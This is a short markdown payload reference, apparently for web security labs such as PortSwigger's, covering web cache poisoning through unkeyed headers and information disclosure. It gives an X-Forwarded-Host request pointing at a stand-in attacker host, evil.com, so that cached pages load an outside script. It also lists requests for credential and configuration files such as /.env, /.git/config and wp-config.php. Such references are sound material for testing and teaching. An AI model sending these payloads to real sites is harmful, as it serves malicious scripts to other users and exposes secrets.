# Web Cache Poisoning - Payload Reference

## Basic Cache Poisoning

### Unkeyed Header Injection
```
# Test which headers are NOT part of cache key
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com    # If reflected and cached = cache poisoning

# If X-Forwarded-Host is reflected in response (e.g., in script src):
# <script src="https://evil.com/resources/script.js">
# This response gets cached, all users get the malicious script
```

### Common Unkeyed Headers
```
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Host
X-Real-IP
```

## Detection Steps

1. Send request with `X-Forwarded-Host: evil.com`
2. Check if response contains `evil.com` in:
   - Script sources
   - Link hrefs
   - Form actions
   - Redirect URLs
3. Send same request WITHOUT the header
4. If response now contains `evil.com` = cache poisoned

## PortSwigger Lab Approach
```
1. GET / with X-Forwarded-Host: exploit-server.net
2. Check response for exploit-server.net in script/link
3. Send same request without header → verify cached response
4. Visit / in browser → should load attacker's script
```

## Cache Key Behavior
```
# Keyed (varies cache): Host, path, method
# Unkeyed (shared cache): X-Forwarded-*, custom headers

# If unkeyed header affects response AND response is cached:
# Cache poisoning possible
```

---

# Information Disclosure - Payload Reference

## Error Message Disclosure
```
# Trigger errors to leak version/framework info
GET /nonexistent-page         → 404 with server version
POST /api with invalid JSON   → Parser error with framework version
GET /admin                    → 403 with internal path disclosure
```

## Backup File Discovery
```
# Common backup extensions
/index.php.bak
/index.php.old
/index.php.orig
/index.php.copy
/index.php~
/index.php.swp
/web.config.bak
/.git/config
/.env
/backup.sql
/database.sql
```

## Version Disclosure
```
# Server headers
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3

# Error pages
# Detailed stack traces
# Debug mode enabled
```

## Source Code Disclosure
```
# .git directory exposure
GET /.git/HEAD
GET /.git/config

# Source maps
GET /main.js.map

# Configuration files
GET /.env
GET /config.php
GET /wp-config.php
```
